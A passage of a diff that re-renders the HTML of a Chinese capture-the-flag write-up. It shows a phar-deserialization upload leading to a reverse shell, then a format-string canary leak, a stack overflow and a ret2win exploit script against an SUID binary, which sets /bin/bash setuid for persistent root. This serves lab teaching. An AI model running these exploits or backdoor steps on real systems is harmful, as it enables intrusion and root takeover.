+    return re.sub(r'%([0-9A-Fa-f]{2})', lambda m: chr(int(m.group(1),16)), s).encode('latin-1')
+b = open('/tmp/exp/body.txt').read()
+a = dec(b).decode('latin-1')
+r = dec(a)
+o = open('/tmp/exp/evil.phar','rb').read()
+print(r == o)
+</code></pre>
+<p>输出 <code>True</code>，没问题。</p>
 <h2>上传并触发</h2>
 <p>登录拿 cookie：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl -s -c cookie.txt -d <span class="pl-s"><span class="pl-pds">'</span>username=admin&amp;password=admin<span class="pl-pds">'</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://<span class="pl-smi">$IP</span>/<span class="pl-pds">"</span></span></pre></div>
+<pre lang="bash"><code>curl -s -c cookie.txt -d 'username=admin&amp;password=admin' &quot;http://$IP/&quot;
+</code></pre>
 <p>submit 上传 phar：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">ID=<span class="pl-s"><span class="pl-pds">$(</span>curl -s -b cookie.txt --data <span class="pl-s"><span class="pl-pds">"</span>blob=<span class="pl-s"><span class="pl-pds">$(</span>cat /tmp/exp/body.txt<span class="pl-pds">)</span></span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://<span class="pl-smi">$IP</span>/?c=Task&amp;m=submit<span class="pl-pds">"</span></span> <span class="pl-k">|</span> grep -oE <span class="pl-s"><span class="pl-pds">'</span>[a-f0-9]{32}<span class="pl-pds">'</span></span><span class="pl-pds">)</span></span>
-<span class="pl-c1">echo</span> <span class="pl-s"><span class="pl-pds">"</span>ID=<span class="pl-smi">$ID</span><span class="pl-pds">"</span></span></pre></div>
-<p>curl 的 <code class="notranslate">--data</code> 把 body.txt 的内容放在 POST body 里，PHP 收到后自动 urldecode 一次（第一次解码），存入 <code class="notranslate">quarantine/&lt;id&gt;.txt</code>。</p>
+<pre lang="bash"><code>ID=$(curl -s -b cookie.txt --data &quot;blob=$(cat /tmp/exp/body.txt)&quot; &quot;http://$IP/?c=Task&amp;m=submit&quot; | grep -oE '[a-f0-9]{32}')
+echo &quot;ID=$ID&quot;
+</code></pre>
+<p>curl 的 <code>--data</code> 把 body.txt 的内容放在 POST body 里，PHP 收到后自动 urldecode 一次（第一次解码），存入 <code>quarantine/&lt;id&gt;.txt</code>。</p>
 <p>repair 触发第二次解码：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl -s -b cookie.txt --data-urlencode <span class="pl-s"><span class="pl-pds">"</span>id=<span class="pl-smi">$ID</span><span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://<span class="pl-smi">$IP</span>/?c=Task&amp;m=repair<span class="pl-pds">"</span></span></pre></div>
-<p>repair 内部 <code class="notranslate">rawurldecode(file_get_contents($src))</code> 把一次编码的内容解回原始二进制，写入 <code class="notranslate">archive/&lt;id&gt;.bin</code>。此时 <code class="notranslate">.bin</code> 就是一个合法的 phar 文件。</p>
+<pre lang="bash"><code>curl -s -b cookie.txt --data-urlencode &quot;id=$ID&quot; &quot;http://$IP/?c=Task&amp;m=repair&quot;
+</code></pre>
+<p>repair 内部 <code>rawurldecode(file_get_contents($src))</code> 把一次编码的内容解回原始二进制，写入 <code>archive/&lt;id&gt;.bin</code>。此时 <code>.bin</code> 就是一个合法的 phar 文件。</p>
 <p>开好监听：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">nc -lvnp 8888</pre></div>
+<pre lang="bash"><code>nc -lvnp 8888
+</code></pre>
 <p>触发 phar 反序列化：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">curl -s -b cookie.txt --data-urlencode <span class="pl-s"><span class="pl-pds">"</span>file=phar:///var/labdata/archive/<span class="pl-smi">$ID</span>.bin/a.txt<span class="pl-pds">"</span></span> <span class="pl-s"><span class="pl-pds">"</span>http://<span class="pl-smi">$IP</span>/?c=Files&amp;m=read<span class="pl-pds">"</span></span></pre></div>
-<p>页面返回 <code class="notranslate">not reasonable</code>，这是 filter 的输出，完全预期。关键是 <code class="notranslate">file_get_contents("phar://...")</code> 已经在 filter 之前执行了，metadata 反序列化触发了整条 gadget 链。</p>
+<pre lang="bash"><code>curl -s -b cookie.txt --data-urlencode &quot;file=phar:///var/labdata/archive/$ID.bin/a.txt&quot; &quot;http://$IP/?c=Files&amp;m=read&quot;
+</code></pre>
+<p>页面返回 <code>not reasonable</code>，这是 filter 的输出，完全预期。关键是 <code>file_get_contents(&quot;phar://...&quot;)</code> 已经在 filter 之前执行了，metadata 反序列化触发了整条 gadget 链。</p>
 <p>监听端收到反弹 shell：</p>
-<pre class="notranslate"><code class="notranslate">www-data@phar:/var/www/html$
+<pre><code>www-data@phar:/var/www/html$
 </code></pre>
 <h1>提权</h1>
 <p>跑了 linpeas，注意到一个异常 SUID：</p>
-<pre class="notranslate"><code class="notranslate">-rwsr-xr-x 1 root root 16432 /opt/vaultd (Unknown SUID binary!)
+<pre><code>-rwsr-xr-x 1 root root 16432 /opt/vaultd (Unknown SUID binary!)
 </code></pre>
 <p>一个自定义的 SUID 程序，未剥离符号。</p>
 <h2>vaultd 分析</h2>
-<div class="highlight highlight-source-shell"><pre class="notranslate">file /opt/vaultd
+<pre lang="bash"><code>file /opt/vaultd
 strings /opt/vaultd
-nm -n /opt/vaultd</pre></div>
-<p>strings 里直接看到了 <code class="notranslate">hidden_maintenance_shell</code>、<code class="notranslate">/bin/sh</code>、<code class="notranslate">[maintenance] win function reached!</code>。nm 给出所有函数地址：</p>
-<pre class="notranslate"><code class="notranslate">0x4013cb hidden_maintenance_shell
+nm -n /opt/vaultd
+</code></pre>
+<p>strings 里直接看到了 <code>hidden_maintenance_shell</code>、<code>/bin/sh</code>、<code>[maintenance] win function reached!</code>。nm 给出所有函数地址：</p>
+<pre><code>0x4013cb hidden_maintenance_shell
 0x401314 support_ticket
 0x401468 restore_recipe
 0x404060 stage (BSS)
 </code></pre>
 <p>程序是菜单式交互，四个选项。用 Ghidra 看了伪代码：</p>
-<p><strong>hidden_maintenance_shell</strong> — 不在菜单里，但编译进了程序。反汇编可以看到它用 syscall 直接调了 <code class="notranslate">setresuid(0,0,0)</code>、<code class="notranslate">setresgid(0,0,0)</code>、<code class="notranslate">execve("/bin/sh", argv, NULL)</code>。只要能跳过去就是 root shell。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">objdump -d -M intel /opt/vaultd <span class="pl-k">|</span> sed -n <span class="pl-s"><span class="pl-pds">'</span>/&lt;hidden_maintenance_shell&gt;/,/^$/p<span class="pl-pds">'</span></span></pre></div>
-<div class="highlight highlight-source-assembly"><pre class="notranslate"><span class="pl-k">mov</span><span class="pl-en">    </span><span class="pl-v">rax</span><span class="pl-s1">,</span><span class="pl-c1">0x77</span><span class="pl-c">     ; setresuid</span>
-<span class="pl-k">syscall</span>
-<span class="pl-k">mov</span><span class="pl-en">    </span><span class="pl-v">rax</span><span class="pl-s1">,</span><span class="pl-c1">0x75</span><span class="pl-c">     ; setresgid</span>
-<span class="pl-k">syscall</span>
-<span class="pl-k">lea</span><span class="pl-en">    </span><span class="pl-v">rdi</span><span class="pl-s1">,[</span><span class="pl-v">rip</span><span class="pl-s1">+</span><span class="pl-en">...</span><span class="pl-s1">]</span><span class="pl-c">  ; "/bin/sh"</span>
-<span class="pl-k">mov</span><span class="pl-en">    </span><span class="pl-v">rax</span><span class="pl-s1">,</span><span class="pl-c1">0x3b</span><span class="pl-c">     ; execve</span>
-<span class="pl-k">syscall</span></pre></div>
+<p><strong>hidden_maintenance_shell</strong> — 不在菜单里，但编译进了程序。反汇编可以看到它用 syscall 直接调了 <code>setresuid(0,0,0)</code>、<code>setresgid(0,0,0)</code>、<code>execve(&quot;/bin/sh&quot;, argv, NULL)</code>。只要能跳过去就是 root shell。</p>
+<pre lang="bash"><code>objdump -d -M intel /opt/vaultd | sed -n '/&lt;hidden_maintenance_shell&gt;/,/^$/p'
+</code></pre>
+<pre lang="asm"><code>mov    rax,0x77     ; setresuid
+syscall
+mov    rax,0x75     ; setresgid
+syscall
+lea    rdi,[rip+...]  ; &quot;/bin/sh&quot;
+mov    rax,0x3b     ; execve
+syscall
+</code></pre>
 <p><strong>support_ticket（菜单2）</strong> — 有个格式化字符串漏洞：</p>
-<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-smi">char</span> <span class="pl-s1">buf</span>[<span class="pl-c1">136</span>];
-<span class="pl-en">read</span>(<span class="pl-c1">0</span>, <span class="pl-s1">buf</span>, <span class="pl-c1">0x7F</span>);
-<span class="pl-en">printf</span>(<span class="pl-s1">buf</span>);</pre></div>
-<p>用户输入被直接传给 printf，可以用 <code class="notranslate">%N$p</code> 泄露栈上的值，包括 canary。</p>
+<pre lang="c"><code>char buf[136];
+read(0, buf, 0x7F);
+printf(buf);
+</code></pre>
+<p>用户输入被直接传给 printf，可以用 <code>%N$p</code> 泄露栈上的值，包括 canary。</p>
 <p><strong>restore_recipe（菜单3）</strong> — 有栈溢出：</p>
-<div class="highlight highlight-source-c"><pre class="notranslate"><span class="pl-smi">char</span> <span class="pl-s1">buf</span>[<span class="pl-c1">72</span>];    <span class="pl-c">// rbp-0x50</span>
-<span class="pl-c">// canary at    rbp-0x08</span>
+<pre lang="c"><code>char buf[72];    // rbp-0x50
+// canary at    rbp-0x08
 
-<span class="pl-en">read</span>(<span class="pl-c1">0</span>, <span class="pl-c1">&amp;</span><span class="pl-s1">stage</span>, <span class="pl-c1">0x400</span>);  <span class="pl-c">// 第一次输入写全局变量，无所谓</span>
-<span class="pl-en">read</span>(<span class="pl-c1">0</span>, <span class="pl-s1">buf</span>, <span class="pl-c1">0x180</span>);     <span class="pl-c">// 第二次输入，0x180 远大于 72，溢出</span></pre></div>
+read(0, &amp;stage, 0x400);  // 第一次输入写全局变量，无所谓
+read(0, buf, 0x180);     // 第二次输入，0x180 远大于 72，溢出
+</code></pre>
 <p>程序开了 Stack Canary，不能直接溢出，得先泄露 canary。</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">readelf -h /opt/vaultd <span class="pl-k">|</span> grep Type</pre></div>
-<pre class="notranslate"><code class="notranslate">Type: EXEC (Executable file)
+<pre lang="bash"><code>readelf -h /opt/vaultd | grep Type
 </code></pre>
-<p>非 PIE，<code class="notranslate">hidden_maintenance_shell</code> 地址固定，可以直接 ret2win。</p>
+<pre><code>Type: EXEC (Executable file)
+</code></pre>
+<p>非 PIE，<code>hidden_maintenance_shell</code> 地址固定，可以直接 ret2win。</p>
 <h2>攻击思路</h2>
-<p>同一个进程内：菜单 2 用格式化字符串泄露 canary → 回到菜单 → 菜单 3 栈溢出覆盖返回地址为 <code class="notranslate">hidden_maintenance_shell</code>。</p>
+<p>同一个进程内：菜单 2 用格式化字符串泄露 canary → 回到菜单 → 菜单 3 栈溢出覆盖返回地址为 <code>hidden_maintenance_shell</code>。</p>
 <p>canary 必须在同一个进程里泄露并使用，每次 fork 新进程 canary 都不一样。</p>
-<p>栈布局：buf 从 <code class="notranslate">rbp-0x50</code> 开始，canary 在 <code class="notranslate">rbp-0x08</code>，到 canary 的偏移是 72 字节。覆盖 canary 后还要 8 字节的 saved rbp，然后是返回地址。</p>
+<p>栈布局：buf 从 <code>rbp-0x50</code> 开始，canary 在 <code>rbp-0x08</code>，到 canary 的偏移是 72 字节。覆盖 canary 后还要 8 字节的 saved rbp，然后是返回地址。</p>
 <p>payload 结构：</p>
-<pre class="notranslate"><code class="notranslate">'A'*72 + p64(canary) + 'B'*8 + p64(0x4013cb)
+<pre><code>'A'*72 + p64(canary) + 'B'*8 + p64(0x4013cb)
 </code></pre>
-<p>这里有一个细节：x86-64 System V ABI 要求在 <code class="notranslate">call</code> 指令执行时 RSP 必须 16 字节对齐。溢出后直接跳 <code class="notranslate">hidden_maintenance_shell</code>，RSP 可能只是 8 字节对齐，导致里面 <code class="notranslate">puts</code> 调用时的 <code class="notranslate">movaps</code> 指令触发 SIGSEGV。解决办法是在返回地址前垫一个只含 <code class="notranslate">ret</code> 指令的 gadget，多弹一次栈凑齐对齐：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">objdump -d -M intel /opt/vaultd <span class="pl-k">|</span> grep -m1 <span class="pl-s"><span class="pl-pds">'</span>ret$<span class="pl-pds">'</span></span></pre></div>
-<pre class="notranslate"><code class="notranslate">40101a: c3    ret
+<p>这里有一个细节：x86-64 System V ABI 要求在 <code>call</code> 指令执行时 RSP 必须 16 字节对齐。溢出后直接跳 <code>hidden_maintenance_shell</code>，RSP 可能只是 8 字节对齐，导致里面 <code>puts</code> 调用时的 <code>movaps</code> 指令触发 SIGSEGV。解决办法是在返回地址前垫一个只含 <code>ret</code> 指令的 gadget，多弹一次栈凑齐对齐：</p>
+<pre lang="bash"><code>objdump -d -M intel /opt/vaultd | grep -m1 'ret$'
+</code></pre>
+<pre><code>40101a: c3    ret
 </code></pre>
 <p>所以实际 payload 有两种形态，脚本里两种都会尝试：</p>
-<pre class="notranslate"><code class="notranslate">'A'*72 + p64(canary) + 'B'*8 + p64(0x4013cb)                          # 直接跳 win
+<pre><code>'A'*72 + p64(canary) + 'B'*8 + p64(0x4013cb)                          # 直接跳 win
 'A'*72 + p64(canary) + 'B'*8 + p64(0x40101a) + p64(0x4013cb)          # ret 对齐后跳 win
 </code></pre>
 <h2>exploit</h2>
-<p>这里踩了个坑。直接在 bash 里用 <code class="notranslate">printf '2\n%1$p...\n'</code> 会被 bash 的 printf 自己解释掉 <code class="notranslate">$</code>，输出一片空白。全部换成 Python 来做交互。</p>
-<p>写了个自动化脚本，遍历格式化字符串偏移 1-100，在同一个进程里泄露值后尝试溢出。如果 canary 对了，程序正常走到 <code class="notranslate">hidden_maintenance_shell</code>；如果 canary 错了，程序会触发 <code class="notranslate">__stack_chk_fail</code> 崩掉。脚本自动判断结果。</p>
-<p>把下面内容保存为 <code class="notranslate">/tmp/pwn.py</code>：</p>
-<div class="highlight highlight-source-python"><pre class="notranslate"><span class="pl-k">import</span> <span class="pl-s1">subprocess</span>,<span class="pl-s1">struct</span>,<span class="pl-s1">os</span>,<span class="pl-s1">sys</span>,<span class="pl-s1">select</span>,<span class="pl-s1">time</span>,<span class="pl-s1">re</span>
+<p>这里踩了个坑。直接在 bash 里用 <code>printf '2\n%1$p...\n'</code> 会被 bash 的 printf 自己解释掉 <code>$</code>，输出一片空白。全部换成 Python 来做交互。</p>
+<p>写了个自动化脚本，遍历格式化字符串偏移 1-100，在同一个进程里泄露值后尝试溢出。如果 canary 对了，程序正常走到 <code>hidden_maintenance_shell</code>；如果 canary 错了，程序会触发 <code>__stack_chk_fail</code> 崩掉。脚本自动判断结果。</p>
+<p>把下面内容保存为 <code>/tmp/pwn.py</code>：</p>
+<pre lang="python"><code>import subprocess,struct,os,sys,select,time,re
 
-<span class="pl-c1">BIN</span> <span class="pl-c1">=</span> <span class="pl-s">'/opt/vaultd'</span>
-<span class="pl-c1">WIN</span> <span class="pl-c1">=</span> <span class="pl-c1">0x4013cb</span>
-<span class="pl-c1">RET</span> <span class="pl-c1">=</span> <span class="pl-c1">0x40101a</span>
+BIN = '/opt/vaultd'
+WIN = 0x4013cb
+RET = 0x40101a
 
-<span class="pl-k">def</span> <span class="pl-en">p64</span>(<span class="pl-s1">x</span>):
-    <span class="pl-k">return</span> <span class="pl-s1">struct</span>.<span class="pl-c1">pack</span>(<span class="pl-s">'&lt;Q'</span>, <span class="pl-s1">x</span>)
+def p64(x):
+    return struct.pack('&lt;Q', x)
 
-<span class="pl-k">def</span> <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-s1">until</span><span class="pl-c1">=</span><span class="pl-s">b'&gt; '</span>, <span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">3</span>):
-    <span class="pl-s1">buf</span> <span class="pl-c1">=</span> <span class="pl-s">b''</span>
-    <span class="pl-s1">deadline</span> <span class="pl-c1">=</span> <span class="pl-s1">time</span>.<span class="pl-c1">time</span>() <span class="pl-c1">+</span> <span class="pl-s1">timeout</span>
-    <span class="pl-k">while</span> <span class="pl-s1">time</span>.<span class="pl-c1">time</span>() <span class="pl-c1">&lt;</span> <span class="pl-s1">deadline</span>:
-        <span class="pl-k">try</span>:
-            <span class="pl-s1">rr</span>, <span class="pl-s1">_</span>, <span class="pl-s1">_</span> <span class="pl-c1">=</span> <span class="pl-s1">select</span>.<span class="pl-c1">select</span>([<span class="pl-s1">proc</span>.<span class="pl-c1">stdout</span>], [], [], <span class="pl-c1">0.1</span>)
-        <span class="pl-k">except</span>:
-            <span class="pl-k">break</span>
-        <span class="pl-k">if</span> <span class="pl-s1">rr</span>:
-            <span class="pl-k">try</span>:
-                <span class="pl-s1">chunk</span> <span class="pl-c1">=</span> <span class="pl-s1">os</span>.<span class="pl-c1">read</span>(<span class="pl-s1">proc</span>.<span class="pl-c1">stdout</span>.<span class="pl-c1">fileno</span>(), <span class="pl-c1">4096</span>)
-            <span class="pl-k">except</span>:
-                <span class="pl-k">break</span>
-            <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">chunk</span>:
-                <span class="pl-k">break</span>
-            <span class="pl-s1">buf</span> <span class="pl-c1">+=</span> <span class="pl-s1">chunk</span>
-            <span class="pl-k">if</span> <span class="pl-s1">until</span> <span class="pl-c1">and</span> <span class="pl-s1">until</span> <span class="pl-c1">in</span> <span class="pl-s1">buf</span>:
-                <span class="pl-k">break</span>
-    <span class="pl-k">return</span> <span class="pl-s1">buf</span>
+def rd(proc, until=b'&gt; ', timeout=3):
+    buf = b''
+    deadline = time.time() + timeout
+    while time.time() &lt; deadline:
+        try:
+            rr, _, _ = select.select([proc.stdout], [], [], 0.1)
+        except:
+            break
+        if rr:
+            try:
+                chunk = os.read(proc.stdout.fileno(), 4096)
+            except:
+                break
+            if not chunk:
+                break
+            buf += chunk
+            if until and until in buf:
+                break
+    return buf
 
-<span class="pl-k">def</span> <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s1">data</span>):
-    <span class="pl-k">try</span>:
-        <span class="pl-s1">proc</span>.<span class="pl-c1">stdin</span>.<span class="pl-c1">write</span>(<span class="pl-s1">data</span>)
-        <span class="pl-s1">proc</span>.<span class="pl-c1">stdin</span>.<span class="pl-c1">flush</span>()
-    <span class="pl-k">except</span>:
-        <span class="pl-k">pass</span>
+def wr(proc, data):
+    try:
+        proc.stdin.write(data)
+        proc.stdin.flush()
+    except:
+        pass
 
-<span class="pl-k">def</span> <span class="pl-en">try_exploit</span>(<span class="pl-s1">canary_idx</span>, <span class="pl-s1">use_ret_gadget</span>):
-    <span class="pl-s1">proc</span> <span class="pl-c1">=</span> <span class="pl-s1">subprocess</span>.<span class="pl-c1">Popen</span>(
-        [<span class="pl-c1">BIN</span>],
-        <span class="pl-s1">stdin</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">PIPE</span>,
-        <span class="pl-s1">stdout</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">PIPE</span>,
-        <span class="pl-s1">stderr</span><span class="pl-c1">=</span><span class="pl-s1">subprocess</span>.<span class="pl-c1">STDOUT</span>
+def try_exploit(canary_idx, use_ret_gadget):
+    proc = subprocess.Popen(
+        [BIN],
+        stdin=subprocess.PIPE,
+        stdout=subprocess.PIPE,
+        stderr=subprocess.STDOUT
     )
-    <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'&gt; '</span>)
-    <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'2<span class="pl-cce">\n</span>'</span>)
-    <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'ticket:<span class="pl-cce">\n</span>'</span>)
-    <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, (<span class="pl-s">'%%%d$p<span class="pl-cce">\n</span>'</span> <span class="pl-c1">%</span> <span class="pl-s1">canary_idx</span>).<span class="pl-c1">encode</span>())
-    <span class="pl-s1">resp</span> <span class="pl-c1">=</span> <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'&gt; '</span>)
-    <span class="pl-s1">matches</span> <span class="pl-c1">=</span> <span class="pl-s1">re</span>.<span class="pl-c1">findall</span>(<span class="pl-s">rb'0x[0-9a-fA-F]+'</span>, <span class="pl-s1">resp</span>)
-    <span class="pl-k">if</span> <span class="pl-c1">not</span> <span class="pl-s1">matches</span>:
-        <span class="pl-s1">proc</span>.<span class="pl-c1">kill</span>()
-        <span class="pl-k">return</span> <span class="pl-c1">None</span>
-    <span class="pl-s1">canary</span> <span class="pl-c1">=</span> <span class="pl-en">int</span>(<span class="pl-s1">matches</span>[<span class="pl-c1">0</span>], <span class="pl-c1">16</span>)
-    <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'3<span class="pl-cce">\n</span>'</span>)
-    <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'memory:<span class="pl-cce">\n</span>'</span>)
-    <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'STAGE<span class="pl-cce">\n</span>'</span>)
-    <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'title:<span class="pl-cce">\n</span>'</span>)
-    <span class="pl-s1">chain</span> <span class="pl-c1">=</span> (<span class="pl-en">p64</span>(<span class="pl-c1">RET</span>) <span class="pl-c1">+</span> <span class="pl-en">p64</span>(<span class="pl-c1">WIN</span>)) <span class="pl-k">if</span> <span class="pl-s1">use_ret_gadget</span> <span class="pl-k">else</span> <span class="pl-en">p64</span>(<span class="pl-c1">WIN</span>)
-    <span class="pl-s1">payload</span> <span class="pl-c1">=</span> <span class="pl-s">b'A'</span> <span class="pl-c1">*</span> <span class="pl-c1">72</span> <span class="pl-c1">+</span> <span class="pl-en">p64</span>(<span class="pl-s1">canary</span>) <span class="pl-c1">+</span> <span class="pl-s">b'B'</span> <span class="pl-c1">*</span> <span class="pl-c1">8</span> <span class="pl-c1">+</span> <span class="pl-s1">chain</span> <span class="pl-c1">+</span> <span class="pl-s">b'<span class="pl-cce">\n</span>'</span>
-    <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s1">payload</span>)
-    <span class="pl-s1">out</span> <span class="pl-c1">=</span> <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'maintenance'</span>, <span class="pl-c1">2</span>)
-    <span class="pl-k">if</span> <span class="pl-s">b'stack smashing'</span> <span class="pl-c1">in</span> <span class="pl-s1">out</span>:
-        <span class="pl-s1">proc</span>.<span class="pl-c1">kill</span>()
-        <span class="pl-k">return</span> <span class="pl-c1">None</span>
-    <span class="pl-k">if</span> <span class="pl-s">b'maintenance'</span> <span class="pl-c1">in</span> <span class="pl-s1">out</span> <span class="pl-c1">or</span> <span class="pl-s">b'$'</span> <span class="pl-c1">in</span> <span class="pl-s1">out</span> <span class="pl-c1">or</span> <span class="pl-s">b'#'</span> <span class="pl-c1">in</span> <span class="pl-s1">out</span>:
-        <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'id<span class="pl-cce">\n</span>'</span>)
-        <span class="pl-s1">time</span>.<span class="pl-c1">sleep</span>(<span class="pl-c1">0.3</span>)
-        <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'cat /root/root.txt<span class="pl-cce">\n</span>'</span>)
-        <span class="pl-s1">time</span>.<span class="pl-c1">sleep</span>(<span class="pl-c1">0.3</span>)
-        <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'chmod u+s /bin/bash<span class="pl-cce">\n</span>'</span>)
-        <span class="pl-s1">time</span>.<span class="pl-c1">sleep</span>(<span class="pl-c1">0.3</span>)
-        <span class="pl-en">wr</span>(<span class="pl-s1">proc</span>, <span class="pl-s">b'exit<span class="pl-cce">\n</span>'</span>)
-        <span class="pl-s1">time</span>.<span class="pl-c1">sleep</span>(<span class="pl-c1">0.3</span>)
-        <span class="pl-s1">final</span> <span class="pl-c1">=</span> <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-c1">None</span>, <span class="pl-c1">3</span>)
-        <span class="pl-k">try</span>:
-            <span class="pl-s1">proc</span>.<span class="pl-c1">wait</span>(<span class="pl-s1">timeout</span><span class="pl-c1">=</span><span class="pl-c1">2</span>)
-        <span class="pl-k">except</span>:
-            <span class="pl-s1">proc</span>.<span class="pl-c1">kill</span>()
-        <span class="pl-k">return</span> (<span class="pl-s1">canary</span>, <span class="pl-s1">canary_idx</span>, <span class="pl-s1">use_ret_gadget</span>, <span class="pl-s1">out</span> <span class="pl-c1">+</span> <span class="pl-s1">final</span>)
-    <span class="pl-s1">remaining</span> <span class="pl-c1">=</span> <span class="pl-en">rd</span>(<span class="pl-s1">proc</span>, <span class="pl-c1">None</span>, <span class="pl-c1">2</span>)
-    <span class="pl-s1">combined</span> <span class="pl-c1">=</span> <span class="pl-s1">out</span> <span class="pl-c1">+</span> <span class="pl-s1">remaining</span>
-    <span class="pl-s1">proc</span>.<span class="pl-c1">kill</span>()
-    <span class="pl-k">if</span> <span class="pl-s">b'uid=0'</span> <span class="pl-c1">in</span> <span class="pl-s1">combined</span> <span class="pl-c1">or</span> <span class="pl-s">b'flag{'</span> <span class="pl-c1">in</span> <span class="pl-s1">combined</span>:
-        <span class="pl-k">return</span> (<span class="pl-s1">canary</span>, <span class="pl-s1">canary_idx</span>, <span class="pl-s1">use_ret_gadget</span>, <span class="pl-s1">combined</span>)
-    <span class="pl-k">return</span> <span class="pl-c1">None</span>
+    rd(proc, b'&gt; ')
+    wr(proc, b'2\n')
+    rd(proc, b'ticket:\n')
+    wr(proc, ('%%%d$p\n' % canary_idx).encode())
+    resp = rd(proc, b'&gt; ')
+    matches = re.findall(rb'0x[0-9a-fA-F]+', resp)
+    if not matches:
+        proc.kill()
+        return None
+    canary = int(matches[0], 16)
+    wr(proc, b'3\n')
+    rd(proc, b'memory:\n')
+    wr(proc, b'STAGE\n')
+    rd(proc, b'title:\n')
+    chain = (p64(RET) + p64(WIN)) if use_ret_gadget else p64(WIN)
+    payload = b'A' * 72 + p64(canary) + b'B' * 8 + chain + b'\n'
+    wr(proc, payload)
+    out = rd(proc, b'maintenance', 2)
+    if b'stack smashing' in out:
+        proc.kill()
+        return None
+    if b'maintenance' in out or b'$' in out or b'#' in out:
+        wr(proc, b'id\n')
+        time.sleep(0.3)
+        wr(proc, b'cat /root/root.txt\n')
+        time.sleep(0.3)
+        wr(proc, b'chmod u+s /bin/bash\n')
+        time.sleep(0.3)
+        wr(proc, b'exit\n')
+        time.sleep(0.3)
+        final = rd(proc, None, 3)
+        try:
+            proc.wait(timeout=2)
+        except:
+            proc.kill()
+        return (canary, canary_idx, use_ret_gadget, out + final)
+    remaining = rd(proc, None, 2)
+    combined = out + remaining
+    proc.kill()
+    if b'uid=0' in combined or b'flag{' in combined:
+        return (canary, canary_idx, use_ret_gadget, combined)
+    return None
 
-<span class="pl-k">for</span> <span class="pl-s1">idx</span> <span class="pl-c1">in</span> <span class="pl-en">range</span>(<span class="pl-c1">1</span>, <span class="pl-c1">100</span>):
-    <span class="pl-k">for</span> <span class="pl-s1">use_ret</span> <span class="pl-c1">in</span> [<span class="pl-c1">False</span>, <span class="pl-c1">True</span>]:
-        <span class="pl-s1">result</span> <span class="pl-c1">=</span> <span class="pl-en">try_exploit</span>(<span class="pl-s1">idx</span>, <span class="pl-s1">use_ret</span>)
-        <span class="pl-k">if</span> <span class="pl-s1">result</span>:
-            <span class="pl-s1">canary</span>, <span class="pl-s1">ci</span>, <span class="pl-s1">ur</span>, <span class="pl-s1">output</span> <span class="pl-c1">=</span> <span class="pl-s1">result</span>
-            <span class="pl-en">print</span>(<span class="pl-s">"[+] idx=%d canary=%s ret=%s"</span> <span class="pl-c1">%</span> (<span class="pl-s1">ci</span>, <span class="pl-en">hex</span>(<span class="pl-s1">canary</span>), <span class="pl-s1">ur</span>))
-            <span class="pl-en">print</span>(<span class="pl-s1">output</span>.<span class="pl-c1">decode</span>(<span class="pl-s1">errors</span><span class="pl-c1">=</span><span class="pl-s">'ignore'</span>))
-            <span class="pl-s1">sys</span>.<span class="pl-c1">exit</span>(<span class="pl-c1">0</span>)</pre></div>
+for idx in range(1, 100):
+    for use_ret in [False, True]:
+        result = try_exploit(idx, use_ret)
+        if result:
+            canary, ci, ur, output = result
+            print(&quot;[+] idx=%d canary=%s ret=%s&quot; % (ci, hex(canary), ur))
+            print(output.decode(errors='ignore'))
+            sys.exit(0)
+</code></pre>
 <p>在 www-data 的 shell 里执行：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">python3 /tmp/pwn.py</pre></div>
-<p>脚本自动找到了正确的 canary 偏移，成功覆盖返回地址跳到 <code class="notranslate">hidden_maintenance_shell</code>。输出里看到了 <code class="notranslate">[maintenance] win function reached!</code> 和 <code class="notranslate">uid=0(root)</code>。</p>
-<p>脚本还顺手执行了 <code class="notranslate">chmod u+s /bin/bash</code>，后面直接用 <code class="notranslate">/bin/bash -p</code> 拿持久 root shell：</p>
-<div class="highlight highlight-source-shell"><pre class="notranslate">/bin/bash -p
-id</pre></div>
-<pre class="notranslate"><code class="notranslate">uid=33(www-data) gid=33(www-data) euid=0(root)
+<pre lang="bash"><code>python3 /tmp/pwn.py
+</code></pre>
+<p>脚本自动找到了正确的 canary 偏移，成功覆盖返回地址跳到 <code>hidden_maintenance_shell</code>。输出里看到了 <code>[maintenance] win function reached!</code> 和 <code>uid=0(root)</code>。</p>
